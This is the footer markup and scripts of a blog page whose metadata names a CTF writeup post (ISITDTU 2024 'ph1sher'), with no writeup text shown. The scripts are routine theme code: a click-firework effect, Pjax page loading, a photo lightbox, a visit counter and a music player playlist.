  
  
  <script
    src="https://npm.webcache.cn/mouse-firework@0.1.0/dist/index.umd.js"
    
    
    
    
    integrity="sha384-KM6i7tu43nYd6e0beIljxHMC5tZc58XBDu7pPA58w50h18Jsx7gLdimfS09RXlKv" crossorigin="anonymous"
  ></script>


<script>
  if (window.firework) {
    const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"#ff5252\",\"#ff7c7c\",\"#ffafaf\",\"#ffd0d0\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"#ff0000\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
    options.excludeElements = options.excludeelements;
    delete options.excludeelements;
    window.firework(options);
  }
</script>



  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/theme-shokax-pjax@0.0.3/dist/index.umd.js"
    
    
    
    
    integrity="sha384-xneY1WY8hOfUzswrE4CrYq35N4BdVcxqxwHPr9zawE/jMSCxD&#43;jAPU55x/jj3wlf" crossorigin="anonymous"
  ></script>


  <script>
    function loadScripts(scripts, index) {
      if (index < scripts.length) {
        const script = scripts[index];
        const src = script.getAttribute('src');

        const loadScript = (scriptContent) => {
          return new Promise((resolve, reject) => {
            const scriptElement = document.createElement('script');
            if (script.type) {
              scriptElement.type = script.type;
            }
            if (script.src) {
              scriptElement.src = script.src;
              scriptElement.onload = resolve;
              scriptElement.onerror = reject;
            }
            if (scriptContent) {
              scriptElement.text = scriptContent;
            }
            document.head.appendChild(scriptElement);
            if (!script.src) {
              resolve();
            }
          })
          
        }

        ;(src ? loadScript() : loadScript(script.text))
          .then(() => loadScripts(scripts, index + 1))
          .catch(error => {
            console.error(`Failed to load script: ${src || 'inline script'}`, error);
            loadScripts(scripts, index + 1);
          });
      }
    }
    window.Pjax &&
      new window.Pjax({
        selectors: [
          "#header>img",
          "#header>picture",
          "head title",
          "#header-title",
          "#subtitle-wrap",
          "#main",
          "#content",
          ".sidebar-widget",
          ".sidebar-wrapper",
          "#mobile-nav",
          "#lazy-script",
        ],
        switches: {
          "#content": function(oldEl, newEl) {
            
            oldEl.className = newEl.className;
            this.onSwitch();
          },
          "#header-title": Pjax.switches.outerHTML,
          "#subtitle-wrap": Pjax.switches.outerHTML,
          "#main": function (oldEl, newEl) {
            const scripts = [...newEl.querySelectorAll("script")];
            loadScripts(scripts, 0);
            oldEl.outerHTML = newEl.outerHTML;
            this.onSwitch();
          },
          "#mobile-nav": Pjax.switches.outerHTML,
          "#lazy-script": function (oldEl, newEl) {
            const scripts = [...newEl.querySelectorAll("script")];
            loadScripts(scripts, 0);
            oldEl.innerHTML = newEl.innerHTML;
            this.onSwitch();
          },
        },
        cacheBust: false,
      });
  </script>
  





  
      
      <script src="/js/pjax.js" integrity="" crossorigin="anonymous" ></script>
      







<div id="lazy-script">
  <div>
    
      
      
        
      
      <script data-pjax>
        window.REIMU_POST = {
          author: "Spid3r",
          title: "Writeups ISITDTU 2024 (Quals) - ph1sher",
          url: "https:\/\/sondt1337.github.io\/post\/isitdtu_ph1sher_quals\/",
          description: "Writeups ISITDTU 2024 (Quals) - ph1sher",
          cover: "https:\/\/sondt1337.github.io\/images\/isitdtu_ph1sher_quals\/featured.png",
        };
      </script>
    
    
    
      





  
      
      <script src="/js/insert_highlight.js" integrity="" crossorigin="anonymous" data-pjax></script>
      

      
      
      
      
      <script type="module" data-pjax>
        const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;

        const pswp = () => {
          if (_$$('.article-entry a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-entry',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")
            }).init();
          }
          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-gallery',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")
            }).init();
          }
          window.lightboxStatus = 'done';
          window.removeEventListener('lightbox:ready', pswp);
        }
        if(window.lightboxStatus === 'ready') {
          pswp()
        } else {
          window.addEventListener('lightbox:ready', pswp);
        }
      </script>
      












      
    
    
  </div>
</div>




  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js"
    
    async
    
    
    integrity="sha384-0M75wtSkhjIInv4coYlaJU83&#43;OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id&#43;S" crossorigin="anonymous"
  ></script>





  





  
       
         
      

  





  
      
      <script src="/js/service_worker.js" integrity="" crossorigin="anonymous" ></script>
      




  

  
  
  
  
  
  
  <script
    src="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.js"
    
    
    
    
    integrity="sha384-gdGYZwHnfJM54evoZhpO0s6ZF5BQiybkiyW7VXr&#43;h5UfruuRL/aORyw&#43;5&#43;HZoU6e" crossorigin="anonymous"
  ></script>


  
    <script>
      const ap = new APlayer({
          theme: "var(--color-link)",
          container: document.getElementById('aplayer'),
          audio: JSON.parse("[{\"artist\":\"Miki Matsubara\",\"cover\":\"/images/song_covers/Mayonaka_no_Door_Stay_With_Me.jpg\",\"lrc\":\"/songs/Mayonaka_no_Door_Stay_With_Me.lrc\",\"name\":\"Mayonaka no Door / Stay With Me\",\"url\":\"/songs/Mayonaka_no_Door_Stay_With_Me.mp3\"},{\"artist\":\"Tomoko Aran\",\"cover\":\"/images/song_covers/Midnight Pretenders.jpg\",\"lrc\":\"/songs/Midnight Pretenders.lrc\",\"name\":\"Midnight Pretenders\",\"url\":\"/songs/Midnight Pretenders.mp3\"},{\"artist\":\"Spectrum\",\"cover\":\"/images/song_covers/F・L・Y.jpg\",\"lrc\":\"/songs/F・L・Y.lrc\",\"name\":\"F・L・Y\",\"url\":\"/songs/F・L・Y.mp3\"},{\"artist\":\"Yoko Oginome\",\"cover\":\"/images/song_covers/LAZY DANCE.jpg\",\"lrc\":\"/songs/LAZY DANCE.lrc\",\"name\":\"LAZY DANCE\",\"url\":\"/songs/LAZY DANCE.mp3\"}]") || [],
          fixed:  null  || false,
          autoplay:  false  || false,
          loop: 'all' || 'all',
          order: '' || 'list',
          preload: '' || 'auto',
          volume:  null  || 0.7,
          mutex:  null  || true,
          listFolded:  false  || false,
          lrcType:  3  || 0,
      });
    </script>
  





    
  </body>
</html>
